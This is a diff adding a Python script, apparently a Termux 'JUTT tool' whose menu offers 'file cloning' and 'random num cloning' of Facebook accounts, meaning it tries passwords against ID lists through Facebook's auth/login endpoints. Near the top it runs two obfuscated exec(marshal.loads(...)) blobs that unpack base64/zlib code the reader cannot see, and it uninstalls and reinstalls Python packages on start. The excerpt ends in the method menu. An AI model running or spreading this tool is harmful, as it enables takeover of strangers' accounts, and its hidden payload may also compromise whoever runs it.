@@ -1,0 +1,938 @@
+#coding = utf-8
+#Coded By NADEEM DOGAR
+import os
+os.system("pkg install espeak -y")
+import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
+import datetime,subprocess
+import zipfile
+import marshal
+from uuid import uuid4
+from time import sleep as sp
+print(f'\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m WELCOME TO  JUTT TOOL :')
+os.system('espeak -a 300 " Wellcome,   To,  ,JUTT ,Tool,"')
+hashes = []
+
+try:
+	import requests
+except ModuleNotFoundError:
+	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+
+try:
+	import bs4
+	from bs4 import BeautifulSoup as pars
+except ModuleNotFoundError:
+	os.system('pip install bs4')
+except Exception as e:
+	print(e)
+
+from concurrent.futures import ThreadPoolExecutor as NADEEMG
+import requests
+from requests.exceptions import ConnectionError as CE
+
+try:
+	key = open(".key.txt","r").read()
+except FileNotFoundError:
+	key = 'none'
+#_________[ PROXY SERVER ]______>>
+#try:
+    #prox= requests.get('https://github.com/NADEEMnadeem5214/File11/Control_Room/blob/main/.prox.txt').text
+    #open('.prox.txt','w').write(prox)
+#except Exception as e:
+    #pass
+#prox=open('.prox.txt','r').read().splitlines()
+SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
+ses = requests.Session()
+#####_____Folder-Setup_____#####
+try:
+	os.makedirs('/sdcard/SOBIYA')
+except:
+		pass
+#___________ [ Lists Used in Script]________
+id = []
+ok = []
+cp = []
+loop = 0
+ugen=[]
+method=[]
+sys.stdout.write('\x1b]2; JUTT\x07')
+exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))
+exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3B\x00\x00\x00\x97\x00\x02\x00e\x00e\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02s.\x01\x00\x00x^\xcd\x94AK\xc3@\x10\x85\xef\xf9\x15#\x05\x9b \xdd\x98\xa6 \xb6\xb5Pz\xb1`=\x08\n\x12KY\x93!Yhv\xd3\xddI\x8d\xff\xde\x8di\xecEo\x122\xa7\xc7\xce\xf2\xde\xeewx\x83\xf9|\xd7N\x04\x1b\xa4L%\x10\xc0\xb3A=Z\xa6(\t\xb6?\xfb\xc5b\xe0\x90\xfe\x9c:`'\xe1\xc4\xe1\x0e4\x1eJ4dX\x8a\xe4\x0e3\xa2\xc2L}_\xf3\x0f\x96\n\xca\xca\xf7\xd2\x1a\xc5J\x92ub\xb1\xca\xfd\xb5\xe1\x87\xd1\xa6\xd4&\x13\x89\xff\xc4%\xf7s.\xa4\xbf\t\x86\x1e#\xac\xe8\xdb\x1b+\x8c\xdd:\xc0s\xb0\x8a\xb1\xa0&\xb2\xd0B\xda\x90\xb7\xeb0\x8cnofA\x0eQ\xa3\x03\xab\xaf\xce\xc7\xdbF\x8e\xeb\x1b\xaf\xaa\x84{~DxT\xb0\xb6\xcf\xd0\x12\tVJJ\x8cI(\t\x8c]\x0c\xbd\x19V\x82\\\xcf\x19\xfc\x06c\xdc=\x8cqoa\x84\xdd\xc3\x08{\x0bc\xd2=\x8cI\xff`,\xf7\xfb\xb67V*A\xb8\x84\x07\x15w\xd3\x1au\xde\xce\xa6\xf5\x0fJ\xddl\xf0\x82\xda\xd4\x1d\xf3G\x83\x1eO\xeb\x7f+\xd1:tgC[\x1c\x9dv\xe7\xf97'\xc5\x0ciQ\xb8\xde\x17\x98F\x07\xfaN)\x03\xda\x04exec\xda\x04zlib\xda\ndecompress\xa9\x00\xf3\x00\x00\x00\x00\xfa\x01 \xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s@\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80T\x87_\x82_\xf0\x00\x00\x16s\r\xf1\x00\x00\x06t\r\xf4\x00\x00\x06t\r\xf1\x00\x00\x01u\r\xf4\x00\x00\x01u\r\xf0\x00\x00\x01u\r\xf0\x00\x00\x01u\r\xf0\x00\x00\x01u\rr\x06\x00\x00\x00"))
+#####_____COLOR_____#####
+G ='\033[92;1m'
+W ='\033[97;1m'
+B='\033[94;1m'
+R ='\033[91;1m'
+Y='\033[93;1m'
+P='\033[95;1m'
+S='\033[96;1m'
+def logo():
+	os.system('clear')
+	logo = (f"""
+{Y}      `7MMF'`7MMF'   `7MF'MMP""MM""YMM MMP""MM""YMM 
+{G}        MM    MM       M  P'   MM   `7 P'   MM   `7 
+{Y}        MM    MM       M       MM           MM      
+{G}        MM    MM       M       MM           MM      
+{Y}        MM    MM       M       MM           MM      
+{G}   (O)  MM    YM.     ,M       MM           MM      
+{Y}    Ymmm9      `bmmmmd"'     .JMML.       .JMML.    
+     {R}ONWER.    : JUTT 
+     {W}GITHUB.   : NOT FOUND
+     {G}WHATSAPP  : 03270864393""")
+	print(logo)
+def clear():
+	os.system("clear")
+	logo()
+def line():
+	print(f"{W}------------------------------------------------")
+#####____string remover_____#####
+def remove_symbols_and_spaces(input_strings):
+    cleaned_strings = re.sub(r'[^a-zA-Z0-9#]', '', input_strings)
+    return cleaned_strings    
+
+#####_____Main-Menu_____#####
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+
+NADEEM_token = f'{id}{xp}'
+
+def connection_token():
+	digits_count = 16
+	letters_count = 16
+	letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
+	digits = ''.join((random.choice(string.digits) for i in range(digits_count)))
+
+	#Convert resultant string to list and shuffle it to mix letters and digits
+	sample_list = list(letters + digits)
+	random.shuffle(sample_list)
+	#convert list to string
+	final_string = ''.join(sample_list)
+	return final_string
+
+nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
+tid = str(random.randint(111,999))
+class iAmMain:
+
+	
+	
+	def __init__(self):
+		
+		self.gp = "https://b-graph.facebook.com/auth/login"
+		self.ap = "https://b-api.facebook.com/auth/login"
+	def iAmMenu(self):
+		#heck_again()
+		logo()
+		line()
+		os.system('espeak -a 300 " Main     ,Menu, "')
+		line()
+		print(f"{W} [{R}1{W}] {W}FILE CLONING     {W}[{G}WORKING{W}] {W}")
+		print(f"{W} [{R}2{W}] {W}FILE CREATE MENU    {W}[{G}WORKING{W}] {W}")
+		print(f"{W} [{R}3{W}] {W}RANDOM NUM CLONING     {W}[{G}WORKING{W}] {W}")
+		print(f"{W} [{R}4{W}] {W}SEPRATE LINKS FROM FILE    {W}[{G}WORKING{W}] {W}")
+		print(f"{W} [{R}5{W}] {W}CUT USED LINK & CHANGE PASS  {W}[{G}WORKING{W}] {W}")
+		print(f"{W} [{R}0{W}] {R}EXIT FROM TEHREEM TOOL {W}[{G}x{W}] {W}")
+		line()
+		line()
+		opt1 = input(f"{W} [{R}+{W}] {W}SELECT ONE : ")
+		if opt1 == "1":self.file_menu()
+		elif opt1 == "2":Create_menu()
+		elif opt1 == "3":Main_Menu()
+		elif opt1 == "4":Grep().with_names()
+		elif opt1 == "5":automation().menu()
+		elif opt1 == "0":exit("{W} [{R}+{W}] {W}THANKS FOR USING NADEEM TOOL!!!!!!! ")
+		else:print(f"{W} [{R}+{W}] {W}WRONG SELECT ");sp(2);self.iAmMenu()
+	
+	
+	def file_menu(self):
+		#check_again()
+		logo()
+		os.system('espeak -a 300 " Enter,   File,  , Name,"')
+		print(f"{W} [{R}+{W}] {G}EXAMPLE /sdcard/filename.txt")
+		line()
+		file = input(f"{W} [{R}+{W}] {W}PUT FILE PATH : ")
+		try:
+			id = open(file,"r").read().splitlines()
+			self.method_select(id)
+		except FileNotFoundError:
+			print(f"{W} [{R}+{W}] {W}INCORECT FILE PATH ")
+			sp(2);self.file_menu()
+		
+	def method_select(self,id):
+		#check_again()
+		logo()
+		os.system('espeak -a 300 " Select, Method,"')
+		line()
+		print(f"{W} [{R}1{W}] {W}METHOD  \033[1;92m[FOR NEW IDS]{W}")
+		print(f"{W} [{R}2{W}] {W}METHOD  \033[1;92m[FOR OLD IDS]{W}")
+		line()
+		m_opt = input(f"{W} [{R}+{W}] {W}SELECT ONE : ")
+		if m_opt =='1':
+			method.append("i")
+			self.password_menu(id)
+		elif m_opt =="2":
+			method.append('ii')
+			self.password_menu(id)
+		#elif m_opt =="3":
+			#method.append('iii')
+			#self.password_menu(id)
+		#elif m_opt =="4":
+			#method.append('iiii')
+			#self.password_menu(id)
+		#elif m_opt =="5":
+			#method.append('iiiii')
